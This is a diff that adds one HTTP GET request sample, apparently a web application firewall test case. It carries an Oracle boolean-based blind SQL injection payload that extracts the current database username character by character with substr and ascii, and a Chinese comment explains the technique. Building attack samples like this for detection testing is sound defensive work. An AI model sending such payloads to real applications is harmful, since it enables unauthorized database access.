@@ -1,0 +1,9 @@
+# SQL注入_GET_oracle_布尔注入-06506315
+# 攻击者基于布尔查询，将"(select ascii(substr((select user from dual),1,1)) from dual)=84"语句注入到 SQL 查询参数中，利用函数substr截取用户名每个字母并获取ascii码值进行判断以获取当前用户名信息。
+GET /?id=1%20and%20%28select%20ascii%28substr%28%28select%20user%20from%20dual%29%2C1%2C1%29%29%20from%20dual%29=84&bid=hd_tag_m8mv240i HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv240i
+RM-PRO-Token: a5f7c7ae7827c50d36e412bcdbf0619a
+RM-PRO-Time: 1742808356280
+User-Agent: curl/7.83.1
+
